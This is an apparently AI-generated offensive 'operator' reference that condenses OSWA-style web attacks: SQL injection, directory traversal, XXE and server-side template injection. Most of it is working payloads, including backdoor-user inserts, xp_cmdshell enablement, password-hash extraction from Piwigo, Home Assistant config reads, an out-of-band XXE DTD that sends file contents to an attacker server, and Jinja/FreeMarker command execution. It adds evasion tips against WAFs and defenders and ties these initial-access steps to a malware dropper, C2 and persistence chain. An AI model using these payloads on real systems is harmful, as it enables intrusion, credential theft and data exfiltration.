---
id: RTO-web-app-attacks
name: Web Application Attacks — SQLi, Directory Traversal, XXE, SSTI
source: OSWA / Offensive Security (WEB-200 style curriculum)
category: web-app-injection
analyzed_by: glm-5.2
analysis_date: 2026-07-21
vault_references: [T020-anti-analysis, T019-edo-dead-drop, T022-networking, T023-client-capabilities]
tags: [sqli, error-based-sqli, stacked-queries, sqlmap, directory-traversal, path-traversal, xxe, oob-exfiltration, ssti, jinja, twig, freemarker, wfuzz, burp-suite, initial-access, web-app-pentest, linux, payload-fuzzing]
---

# Web Application Attacks — Training Reference

## TL;DR
This module consolidates four classic web application attack classes from the OSWA curriculum: SQL injection (stacked queries, file I/O, OS command exec, error-based exfil, sqlmap automation), directory traversal (suggestive parameters, relative vs absolute pathing, Wfuzz enumeration), XML External Entity (XXE) injection (in-band, error-based, and out-of-band exfiltration), and server-side template injection (SSTI). The training is Linux/web-stack centric and complements the existing Windows-only vault by providing **initial-access** primitives that precede endpoint tradecraft. Cross-references to the vault are largely conceptual (LOtL command execution, dead-drop C2, exfiltration engine) rather than technical — operators should treat this as the pre-foothold phase that the dark_crystal/client_rust crates operate *after*.

## Key Concepts

1. **Stacked Queries** — Chaining a second (or Nth) SQL statement after the application's intended query, separated by `;`. Usefulness depends on DB engine (PostgreSQL, MSSQL support; MySQL's `mysqli_query` typically doesn't execute stacked queries). The application's result-handling logic dictates whether stacked SELECTs surface or whether only DML (INSERT/UPDATE/DELETE) returns nothing visible. **Vault link:** None directly — vault is post-foothold only.

2. **Database File I/O Primitives** — PostgreSQL `COPY FROM/TO`, `pg_read_file()`; MySQL `LOAD_FILE()`, `INTO OUTFILE`; gated by `secure_file_priv` (MySQL), DB-user filesystem perms. Enables local file reads (data exfil) and writes (webshell drop). **Vault link:** Conceptually parallel to dark_crystal's transport.rs payload acquisition (embed vs remote) — different layer, same outcome class.

3. **OS Command Execution via SQL** — MSSQL `xp_cmdshell` (requires `EXECUTE sp_configure` enable cascade + `RECONFIGURE`); Linux SQL Server doesn't support it. Returns rows of text. **Vault link:** T-020 Kaguya LOtL binary inventory is the endpoint-side analogue — both are command-execution primitives chained from an unexpected interpreter.

4. **sqlmap Automation** — `sqlmap -u <url> --method POST --data "..." -p "<params>" --dbms=<db> --dump --flush-session`; supports `--os-shell` for webshell upload (works only when DB writes to web root + app is ASP/ASPX/JSP/PHP). Session caching via `--flush-session` is critical when switching DBs in a multi-DB sandbox.

5. **Error-Based SQLi via XPATH** — MySQL `extractvalue('', concat('>', (subquery)))` triggers `XPATH syntax error` returning 32 chars of the subquery result. `group_concat()` aggregates multi-row results to fit single-value function. `SUBSTRING(col, start, len)` defeats the 32-char truncation limit. `LIMIT n OFFSET m` paginates through rows. Confirmed against Piwigo CVE-2021-32615 (Harry Goodman / NCC Group) in `order[0][dir]` ORDER BY injection.

6. **Directory Traversal Strings** — `../` (Linux), `..\` (Windows, equivalent), URL-encoded `..%2F`; absolute pathing bypasses relative sanitization when the application concatenates user input to a base path.

7. **Suggestive Parameters** — Parameters named `file`, `f`, `path`, `location`, `download`, `data`, `image`, `search` etc. are high-value targets for traversal/LFI testing because the name implies file or data handling.

8. **Wfuzz LFI Enumeration** — `wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt <url>?path=FUZZ` with `--hc 404 --hh <error_sizes>` to filter noise. Different 404 sizes between endpoints indicate distinct handler stacks (confirmed against Home Assistant `/fontawesome/`).

9. **Relative vs Absolute Pathing** — Relative: `cat group` from `/etc/`. Absolute: `cat /etc/group`. Web apps may use either; relative paths with hard-coded prefixes are vulnerable to traversal strings; absolute paths bypass prefix concatenation entirely.

10. **XML Entity Types** — Internal (`<!ENTITY name "value">`), External private (`SYSTEM "URI"`), External public (`PUBLIC "id" "URI"`), Parameter (`%`-prefixed, DTD-only). External entities are the XXE primitive; parameter entities enable OOB chaining because they're expanded during DTD processing.

11. **XXE Exfiltration Modes** — In-band (entity content reflected in response), Error-based (entity content surfaces in verbose error via type/length mismatch), Out-of-band (parameter entity chains file content into HTTP request to attacker-controlled server). Apache OFBiz confirmed vulnerable via `EntityImport` page; OOB verified via Apache access.log.

12. **SSTI Expression vs Statement** — Expressions produce values (`{{ var }}`), statements perform control flow (`{% for %}`). Determining the engine (Twig, FreeMarker, Pug, Jinja, Mustache, Handlebars) by syntax probing is step 1; engine-specific RCE payloads follow. Jinja covered in detail; others referenced.

## Operational Techniques

### Stacked Query INSERT (PostgreSQL / MSSQL)
- **What**: Append a DML statement after the original query to write data without it being surfaced.
- **When to use**: Confirmed DB engine supports stacked queries (PostgreSQL, MSSQL) and you need to add a row (e.g., create a backdoor user) without visible confirmation.
- **How**:
  1. Identify an injectable numeric or string parameter (sandbox: `Menu Item ID` on `http://sql-sandbox/intro`).
  2. Submit `10; insert into users(id, username, password) values (1001,'hax','hax');`.
  3. Set DB to PostgreSQL, click *Submit Query*.
  4. Application returns no rows (expected — INSERT returns no data).
  5. Verify via SQL Console: `select * from users;` — confirm row `1001,hax,hax` was added.
- **Vault link**: None. Vault handles endpoint-side persistence (T-017), not DB-layer backdoors.
- **Tool/code**: SQL Sandbox app, SQL Console, manual payloads.
- **OPSEC**: INSERTs are logged in DB query logs. Use a plausible username. Subsequent UNION/stacked SELECT can verify silently.

### PostgreSQL File Read via COPY FROM
- **What**: Stage `/etc/passwd` into a temp table then SELECT it back.
- **When to use**: DB user can `CREATE TABLE` and the PostgreSQL service account has read perms on target file.
- **How**:
  ```sql
  create table tmp(data text);
  copy tmp from '/etc/passwd';
  select * from tmp;
  ```
  Drop afterward with `drop table tmp;`.
- **Vault link**: None — vault exfil is post-exploitation via amaterasu.rs (T-023). This is initial-access exfil.
- **Tool/code**: SQL Sandbox SQL Console, PostgreSQL.
- **OPSEC**: Table creation is visible in DB metadata (information_schema.tables). Always drop the temp table.

### PostgreSQL File Read via pg_read_file()
- **What**: Read a file without creating a table.
- **When to use**: DB user lacks CREATE TABLE but `pg_read_file()` is callable (superuser-only by default).
- **How**: `SELECT pg_read_file('/etc/passwd');` — returns a single field with the entire file. For UNION-based attacks, pad with static columns to match the original query column count.
- **Vault link**: None.
- **Tool/code**: PostgreSQL, SQL Console.
- **OPSEC**: Single-statement — less footprint than COPY FROM. Function call still logged.

### MySQL File Read/Write (LOAD_FILE / INTO OUTFILE)
- **What**: Read or write OS files via MySQL when `secure_file_priv` permits.
- **When to use**: Confirmed MySQL backend; check first with `SELECT @@GLOBAL.secure_file_priv;`. Empty string or NULL = unrestricted; path = restricted to that dir.
- **How**:
  1. Write: `SELECT * FROM users INTO OUTFILE '/var/lib/mysql-files/test.txt';` (must use the `secure_file_priv` directory).
  2. Read back: `SELECT LOAD_FILE('/var/lib/mysql-files/test.txt');`.
  3. Reading a file outside the permitted directory returns NULL.
- **Vault link**: None. Conceptually parallel to T-022 WinHTTP staged download (`winhttp_dl.rs`) — both pull files to disk; this is the web-app-tier variant.
- **Tool/code**: MySQL, SQL Console.
- **OPSEC**: OUTFILE writes are visible in OS filesystem with MySQL service account ownership. Webshell drops require the web root to be writable by the MySQL user — uncommon in hardened configs.

### MSSQL xp_cmdshell RCE
- **What**: Execute OS commands via MSSQL extended procedure.
- **When to use**: Confirmed MSSQL on Windows; stacked queries available; DB user has `sysadmin` or appropriate role.
- **How**:
  ```sql
  EXECUTE sp_configure 'show advanced options', 1;
  RECONFIGURE;
  EXECUTE sp_configure 'xp_cmdshell', 1;
  RECONFIGURE;
  EXECUTE xp_cmdshell 'whoami';
  ```
  Note: `xp_cmdshell` is called with `EXECUTE`, not `SELECT`. Linux SQL Server does **not** support `xp_cmdshell`.
- **Vault link**: T-020 Kaguya LOtL (binary inventory + EDR detection) is the post-foothold counterpart — both enumerate/execute via native facilities. dark_crystal's experimental `wmi_exec.rs` (T-023) is the endpoint-side parallel.
- **Tool/code**: MSSQL, sqlmap (`--os-shell` automates this).
- **OPSEC**: `sp_configure` calls and `xp_cmdshell` invocations are loud in SQL Server audit logs. Modern hardened builds have `xp_cmdshell` disabled and the sp_configure change itself can trigger alerts.

### sqlmap Automated Dump
- **What**: Automated identification + exploitation of SQLi with DB dump.
- **When to use**: Initial recon of a suspected injectable parameter; manual confirmation has been done.
- **How**:
  ```bash
  sqlmap -u http://sql-sandbox/sqlmap/api \
    --method POST \
    --data "db=mysql&name=taco&sort=id&order=asc" \
    -p "name,sort,order" --dbms=mysql --dump --flush-session
  ```
  Excludes `db` parameter (used for routing). Output dumped to `~/.local/share/sqlmap/output/<host>/dump/<db>/<table>.csv`.
- **Vault link**: None directly; sqlmap `--os-shell` produces a foothold that dark_crystal's loader could then take over (chain: web-app RCE → dark_crystal dropper → T-007 injection).
- **Tool/code**: sqlmap (Kali preinstalled), Burp Suite for request capture.
- **OPSEC**: sqlmap is noisy — issues hundreds of requests with known SQLi signatures. WAFs / IDS detect default payloads. Use `--random-agent`, `--delay`, `--tamper` in production engagements. Always `--flush-session` when switching DBs in the sandbox.

### Error-Based SQLi (ExtractValue) — Piwigo CVE-2021-32615
- **What**: Exfil DB contents via verbose MySQL XPATH errors when reflection isn't available.
- **When to use**: Confirmed MySQL backend with verbose error messages; injection point is in ORDER BY (no UNION possible).
- **How** (from training, against Piwigo `order[0][dir]`):
  1. POST to `/admin/user_list_backend.php` with `order[0][dir]=asc'` — observe error revealing `ORDER BY id asc' LIMIT 0, 10`.
  2. Enumerate schemas:
     ```sql
     asc, extractvalue('',concat('>',(select group_concat(table_schema) from (select table_schema from information_schema.tables group by table_schema) as foo)))
     ```
  3. Enumerate tables (32-char limit forces pagination):
     ```sql
     asc, extractvalue('',concat('>',(select group_concat(table_name) from (select table_name from information_schema.tables where table_schema='piwigo' limit 2 offset 2) as foo)))
     ```
  4. Enumerate columns of `piwigo_users`:
     ```sql
     asc, extractvalue('',concat('>',(select group_concat(column_name) from (select column_name from information_schema.columns where table_schema='piwigo' and table_name='piwigo_users') as foo)))
     ```
  5. Extract password hashes (32 chars at a time via `SUBSTRING`):
     ```sql
     asc, extractvalue('',concat('>',(select substring(password,1,32) from piwigo_users limit 1 offset 0)))
     ```
     Increment offset for additional rows; increment substring start (33, 65, …) for full hash beyond 32 chars.
  6. `$P$` prefix indicates phpass Portable hash — crack offline with hashcat.
- **Vault link**: None technically. Conceptually similar to dark_crystal's experimental diagnostic.rs marker-based verification (T-020) — both extract structured data via iterative probing.
- **Tool/code**: Burp Suite Repeater, MySQL `extractvalue`, `group_concat`, `SUBSTRING`, `LIMIT ... OFFSET`.
- **OPSEC**: Verbose DB errors are loud in app logs. XPATH errors are uncommon in legitimate traffic — high-signal for blue team. Pagination via OFFSET generates many requests — spread over time.

### Directory Traversal — Absolute Path
- **What**: Bypass relative-path sanitization by supplying a full path from rootfs.
- **When to use**: Parameter value is concatenated to a base path; absolute path overrides the prefix.
- **How**: Target `http://dirTravSandbox/absolutePathing.php?path=/var/www/html/data.txt` — direct read of `data.txt` regardless of any prefix logic.
- **Vault link**: None — vault doesn't cover web tier.
- **Tool/code**: Browser, Burp Repeater.
- **OPSEC**: Absolute paths in query strings are extremely anomalous in legit traffic — WAFs flag them readily.

### Directory Traversal — Relative Path with Traversal Strings
- **What**: Escape the application's working directory using `../` (or `..%2F` URL-encoded).
- **When to use**: Application strips/concatenates relative paths but doesn't normalize; absolute path doesn't work.
- **How**: `http://dirTravSandbox/relativePathingVerbose.php?path=../../../../../../../../../../etc/passwd`. Use `View Page Source` to preserve whitespace in the rendered output.
- **Vault link**: None.
- **Tool/code**: Browser, Burp Repeater.
- **OPSEC**: Many `../` sequences in a URL is a high-signal WAF/IDS signature. Use shorter encodings (`..%2F`) or null-byte tricks (legacy servers) when applicable.

### Wfuzz LFI/Traversal Enumeration
- **What**: Fuzz a vulnerable path parameter against a known LFI wordlist to enumerate readable OS files.
- **When to use**: Confirmed traversal primitive; need to enumerate target filesystem contents.
- **How**:
  ```bash
  wfuzz -c -z file,/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
    --hc 404 --hh 81,125 \
    http://dirTravSandbox/relativePathing.php?path=../../../../../../../../../../../../FUZZ
  ```
  - `--hh 81,125` filters the two common error response sizes.
  - Use `--hc 404` to drop 404s.
  - Cross-reference 404 sizes between endpoints (web-root vs `/fontawesome/`) — divergent sizes indicate distinct handler stacks.
- **Vault link**: T-023 byakugan.rs (network recon — ARP, TCP, AD enum) is the endpoint-tier counterpart; both enumerate the target before deeper exploitation.
- **Tool/code**: Wfuzz 3.1.0, SecLists `LFI-Jhaddix.txt`, dirb `common.txt` for endpoint discovery.
- **OPSEC**: 914-request fuzz run is loud. Throttle with `-t 1` and `--sdelay` against production.

### Home Assistant Directory Traversal (Case Study)
- **What**: Real-world CVE in Home Assistant `< 2021.x` — `/fontawesome/` endpoint doesn't sanitize traversal, allowing config file exfil.
- **When to use**: Engagement targeting Home Assistant on port 8123.
- **How**:
  1. Browse `http://homeassistant:8123/`, observe `/fontawesome/` in Burp HTTP history.
  2. Fuzz `/fontawesome/FUZZ` with dirb `common.txt`; observe 0-char 404s (vs 14-char at web-root) — distinct handler.
  3. Send `/fontawesome/data/fas.js` to Repeater; replace path with `../../../../../../../../../../../../etc/passwd`.
  4. Pivot to config enumeration: `/fontawesome/../../../configuration.yaml`.
  5. Full LFI enumeration via SecLists `LFI-Jhaddix.txt`.
- **Vault link**: T-017 persistence suite documents config files as persistence anchors (NTFS EA, COM hijack) — Home Assistant's `configuration.yaml` is the web-tier analog.
- **Tool/code**: Burp Suite, Wfuzz, SecLists.
- **OPSEC**: Real CVE — fixed in current versions. Many config files contain secrets (long-lived API tokens, DB credentials) — high-value but high-signal in access logs.

### XML Internal Entity Test (XXE Confirmation)
- **What**: Confirm the parser resolves entities by injecting a known-value internal entity and observing reflection.
- **When to use**: Application accepts XML input (import endpoint, SOAP API, REST with XML body); need to confirm parser processes entities.
- **How**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE data [
    <!ELEMENT data ANY>
    <!ENTITY lastname "Replaced">
  ]>
  <Contact><lastName>&lastname;</lastName><firstName>Tom</firstName></Contact>
  ```
  If response shows "Tom Replaced", parser is XXE-vulnerable.
- **Vault link**: None.
- **Tool/code**: Any XML-accepting endpoint; Burp Repeater.
- **OPSEC**: Internal entity test is benign-looking — minimal blue-team signature.

### XXE File Read (In-Band)
- **What**: Read OS files via `file://` URI in an external entity.
- **When to use**: Confirmed XXE; application reflects parsed entity content.
- **How**:
  ```xml
  <?xml version="1.0"?>
  <!DOCTYPE data [
    <!ELEMENT data ANY>
    <!ENTITY lastname SYSTEM "file:///etc/passwd">
  ]>
  <Contact><lastName>&lastname;</lastName><firstName>Tom</firstName></Contact>
  ```
- **Vault link**: None directly. Conceptually, the OOB variant below is the web-tier analogue of T-019 Edo Dead Drop (autonomous C2 via third-party services).
- **Tool/code**: Burp Repeater, target XML endpoint.
- **OPSEC**: File URIs in XML are anomalous — modern parsers disable external entity resolution by default (Java `feature-disallow-doctype-decl`). Pre-2018 default configs are vulnerable.

### XXE Error-Based Exfil
- **What**: Surface file contents in a verbose error by injecting entity content into a typed/length-constrained field.
- **When to use**: No in-band reflection but verbose errors are returned (e.g., Java stack traces).
- **How** (Apache OFBiz, target `description` element with VARCHAR length constraint):
  ```xml
  <!DOCTYPE data [
    <!ELEMENT data ANY>
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
  ]>
  <entity-engine-xml>
    <Product ...>
      <createdStamp>2021-06-04 08:15:49</createdStamp>
      <description>&xxe;</description>
      <longDescription>XXE</longDescription>
    </Product>
  </entity-engine-xml>
  ```
  Response includes: `A truncation error was encountered trying to shrink VARCHAR` + file contents.
- **Vault link**: None.
- **Tool/code**: Burp Repeater, OFBiz `EntityImport` endpoint.
- **OPSEC**: Error-based exfil requires the file content to be longer than the column constraint; short files won't trigger the error.

### XXE Out-of-Band (OOB) Exfil via Parameter Entities
- **What**: Force the parser to make an HTTP request to attacker-controlled server with file contents in the query string.
- **When to use**: No reflection, no errors; target parser supports parameter entities and outbound HTTP.
- **How**:
  1. Host `external.dtd` on attacker Apache (`/var/www/html/external.dtd`):
     ```xml
     <!ENTITY % content SYSTEM "file:///etc/timezone">
     <!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://<attacker-ip>/out?%content;'>" >
     ```
  2. Submit payload referencing the remote DTD:
     ```xml
     <?xml version="1.0" encoding="utf-8"?>
     <!DOCTYPE oob [
       <!ENTITY % base SYSTEM "http://<attacker-ip>/external.dtd">
       %base; %external; %exfil;
     ]>
     <entity-engine-xml></entity-engine-xml>
     ```
  3. Verify via `sudo tail /var/log/apache2/access.log` — look for `GET /out?<file-contents>`.
  4. Target single-line, low-special-character files (`/etc/timezone`, `/etc/hostname`) — multi-line files like `/etc/passwd` cause `MalformedURLException: Illegal character in URL`.
- **Vault link**: T-019 Edo Dead Drop is the endpoint-side analogue (autonomous C2 via Google Translate, blockchain, steganography). Both exfil via third-party infrastructure to bypass direct callbacks.
- **Tool/code**: Apache, custom DTD file, Burp Repeater, Apache access.log.
- **OPSEC**: The XML parser makes outbound HTTP from the target — network egress monitoring catches this. Use legitimate-looking domains; encode file contents (Base64 via `php://filter`) if parser supports wrappers.

### SSTI Discovery — Template Probe
- **What**: Detect SSTI by injecting template syntax and observing the response.
- **When to use**: Any parameter that may be template-rendered (email body, name field, message field).
- **How**: Inject `{{ 7*7 }}` — if response contains `49`, SSTI confirmed. Then probe engine-specific syntax:
  - Jinja: `{{ 7*'7' }}` → `7777777`
  - Twig: `{{ 7*'7' }}` → `49`
  - FreeMarker: `${7*'7'}` → `49` (Java)
  - Pug: `#{7*7}` → `49`
- **Vault link**: None directly. T-021 string obfuscation proc macro is the obfuscation counterpart; SSTI is the input-mishandling counterpart.
- **Tool/code**: Burp Repeater, manual probes.
- **OPSEC**: Mathematical expressions in reflected fields are anomalous — high-signal for WAFs. Use less obvious probes (`{{ self }}`, `${7*7}`) when stealth matters.

### SSTI RCE (Engine-Specific)
- **What**: Escalate from SSTI confirmation to OS command execution.
- **When to use**: Server-side rendering with engine that exposes language runtime (Jinja → Python, FreeMarker → Java).
- **How** (Jinja reference, detailed payloads in subsequent sections of training):
  ```python
  {{ ''.__class__.__mro__[1].__subclasses__() }}
  # Find Popen, then:
  {{ ''.__class__.__mro__[1].__subclasses__()[<Popen index>]('id', shell=True, stdout=-2).communicate() }}
  ```
  FreeMarker: `<#assign cmd="freemarker.template.utility.Execute"?new()> ${cmd("id")}`
- **Vault link**: None — vault is endpoint-side post-foothold.
- **Tool/code**: Burp Repeater, engine-specific payloads (Tplmap, PayloadsAllTheThings).
- **OPSEC**: SSTI RCE spawns child processes under the web server's identity — visible in process tree. Spawn benign-looking process names if possible.

## Tool & Tradecraft Reference

| Tool/Command | Purpose | OPSEC Notes |
|---|---|---|
| `sqlmap -u <url> --method POST --data "..." -p <params> --dbms=<db> --dump` | Automated SQLi exploitation | Hundreds of requests; use `--delay`, `--random-agent`, `--tamper` |
| `sqlmap --os-shell` | Automated webshell upload | Only ASP/ASPX/JSP/PHP; requires DB writes to web root |
| `sqlmap --flush-session` | Ignore prior scan cache | Critical when switching DBs in a multi-DB sandbox |
| Burp Suite Repeater | Manual payload iteration | Persistent tabs; baseline-then-modify workflow |
| Burp Suite Decoder | URL-encoding/decoding POST bodies | Decode `+` as space, `%2F` as `/` |
| Wfuzz `-c -z file,<wordlist> --hc <codes> --hh <sizes>` | Fuzzing endpoints/params | Loud; throttle and filter by response size |
| SecLists `LFI-Jhaddix.txt` | LFI/traversal payload wordlist | 914 entries; comprehensive |
| SecLists `dirb/common.txt` | Web root enumeration | 4614 entries; baseline |
| `wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt http://<host>/FUZZ` | 404-size differential endpoint discovery | Compare response sizes between endpoints |
| `cat ../../etc/passwd` | Local Linux traversal demo | Confirms traversal string concept |
| `curl -v <url> -o <file>` | Raw HTTP w/o browser normalization | Useful for traversal that browsers re-route |
| MySQL `extractvalue('',concat('>',<subquery>))` | Error-based exfil (32-char limit) | XPATH errors anomalous in prod |
| MySQL `group_concat()` | Aggregate multi-row results into single value | Required for `extractvalue` single-value constraint |
| MySQL `SUBSTRING(col, start, len)` | Defeat 32-char XPATH truncation | Iterate `start` by 32 |
| MySQL `LIMIT n OFFSET m` | Paginate error-based row extraction | Iterate `m` |
| MSSQL `EXECUTE sp_configure 'show advanced options', 1; RECONFIGURE;` | Enable `xp_cmdshell` precursor | Loud in SQL audit logs |
| MSSQL `EXECUTE xp_cmdshell '<cmd>'` | OS command execution | Linux SQL Server doesn't support |
| PostgreSQL `COPY <table> FROM '<file>'` | File → table load | Requires CREATE TABLE perms |
| PostgreSQL `pg_read_file('<path>')` | File read without table creation | Superuser-only by default |
| MySQL `SELECT ... INTO OUTFILE '<path>'` | File write | Gated by `secure_file_priv` |
| MySQL `SELECT LOAD_FILE('<path>')` | File read | Gated by `secure_file_priv` |
| `SELECT @@GLOBAL.secure_file_priv;` | Check MySQL file I/O restrictions | Empty/NULL = unrestricted |
| Apache `access.log` | Verify OOB XXE callbacks | `sudo tail /var/log/apache2/access.log` |
| `sudo systemctl start apache2` | Host attacker DTD for OOB XXE | Visible service start; use Python `http.server` for stealth |
| XML `<!DOCTYPE ... [<!ENTITY name SYSTEM "URI">]>` | External entity declaration | Modern parsers disable by default |
| XML parameter entities (`%name`) | DTD-only entities for OOB chains | Required for OOB because expanded during DTD processing |
| `{{ 7*7 }}` / `${7*7}` / `#{7*7}` | SSTI detection probes | Engine-specific syntax variants |

## Gaps & Extensions

### Vault coverage this training lacks
- **Windows endpoint tradecraft** — entire vault scope (syscalls, sleep obfuscation, 15 injection methods, 13 EDR evasion techniques, persistence, anti-analysis, BYOVD). This training is exclusively web-tier and Linux-flavored.
- **EDR/AV evasion** — no mention of EDR, hooking, AMSI/ETW, syscall stubs. The training assumes a permissive target.
- **C2 infrastructure** — no C2 framework concepts; this is initial-access only.
- **Payload development** — no shellcode, no PE loaders, no Rust/FFI patterns.
- **Persistence beyond webshell** — no schtask/COM/NTFS EA coverage.
- **Credential harvesting beyond DB hashes** — no LSASS dump, browser hook, clipboard monitoring.

### Training coverage the vault lacks
- **Web application attack classes** (SQLi, traversal, XXE, SSTI) — entirely absent from vault.
- **Initial-access primitives** that precede endpoint execution — the vault assumes a foothold exists.
- **sqlmap and Wfuzz tradecraft** — vault has no automation tooling references.
- **Verbose error exploitation** — vault's diagnostic.rs is for self-test, not target error message exploitation.
- **OOB exfiltration via third-party HTTP** — vault's T-019 Edo Dead Drop uses rentry.co and Ethereum TX, not arbitrary HTTP callback.
- **Outbound network request as exfil channel** — conceptually parallel but technically distinct.

### Honest assessment
The vault is a **post-foothold Windows tradecraft library**; this training is **pre-foothold web app pentesting**. They are largely non-overlapping. The cross-references above are conceptual at best. An operator running a full engagement would chain: **OSWA training for initial access → dark_crystal for payload delivery → client_rust for C2 + capabilities**. A more accurate vault tag for this document is "initial-access-web-tier" rather than any of the existing vault categories.

Specific outdated/superseded items:
- sqlmap `--os-shell` is slow and noisy; modern operators prefer manual webshell upload via MySQL OUTFILE or xxserve-style tooling.
- Many XXE techniques assume pre-2018 parser defaults; modern Java/Python parsers disable external entity resolution by default. OOB via parameter entities still works on misconfigured parsers but is increasingly rare in the wild.
- Piwigo CVE-2021-32615 and Home Assistant directory traversal are patched — useful as training references but not directly exploitable against current versions.

## Cross-Reference Matrix

| Training Concept | Vault Technique | Relationship |
|---|---|---|
| MSSQL `xp_cmdshell` OS command exec | T-020 (Kaguya LOtL) | Both are native-facility command execution; vault is endpoint-side, training is DB-tier |
| sqlmap `--os-shell` webshell upload | T-022 (Network — WinHTTP download) | Both pull/run code from HTTP; vault is dropper-side, training is web-app-side |
| XXE OOB exfil via parameter entities + remote DTD | T-019 (Edo Dead Drop — rentry.co, Ethereum, steganography) | Both exfil via third-party infrastructure; vault is more sophisticated (multi-channel) |
| sqlmap `--dump` data extraction | T-023 (amaterasu.rs exfiltration engine) | Both extract structured data from target; vault is post-foothold |
| Wfuzz LFI enumeration | T-023 (byakugan.rs network recon — ARP, TCP, AD enum) | Both enumerate target before deeper exploitation; different layers |
| Error-based SQLi pagination via LIMIT/OFFSET | T-020 (diagnostic.rs marker-based verification) | Both iteratively probe to extract structured info |
| Directory traversal of config files | T-017 (Persistence Suite — config-file anchors) | Config files are persistence/exfil targets in both; different OS tiers |
| SSTI engine identification via syntax probing | T-002 (Hell's/Halo's/Tartarus Gate — 4-stage SSN cascade) | Both identify target via progressive probing; different domain |
| Stacked INSERT for backdoor account | T-017 (Five-Layer Persistence) | Both establish foothold account; vault uses OS-layer, training uses DB-layer |
| MySQL `INTO OUTFILE` webshell drop | T-007 (Process Injection — 15 methods) | Both execute attacker code in target context; different layers entirely |
| Burp Suite Repeater iterative payload dev | T-020 (diagnostic.rs integration test harness) | Both are test-harness-driven tradecraft development |
| `secure_file_priv` check before file I/O | T-020 (Anti-VM 10-check suite) | Both perform pre-attack capability assessment |
| Outbound HTTP callback (XXE OOB) | T-019 (Edo Dead Drop — Google Translate HTTP) | Both use HTTP egress for exfil; vault wraps in legitimate service |
| Verbose error exploitation (XPATH, VARCHAR truncation) | T-016 (KiUserException StepOver) | Both manipulate exception/error paths for offense; very different mechanisms |
| Suggestive parameter enumeration | T-023 (recon via byakugan.rs) | Both identify high-value targets via naming/contextual hints |
| Home Assistant `configuration.yaml` exfil | T-017 (NTFS EA persistence) | Both weaponize config files; vault writes, training reads |

---

**Document scope note:** This training batch is *outside* the vault's primary domain (Windows endpoint tradecraft). It is included for completeness of an operator's reference library — initial-access web tier precedes the endpoint-tier techniques the vault documents. Operators should treat this document as the pre-foothold complement to vault techniques T-001 through T-023.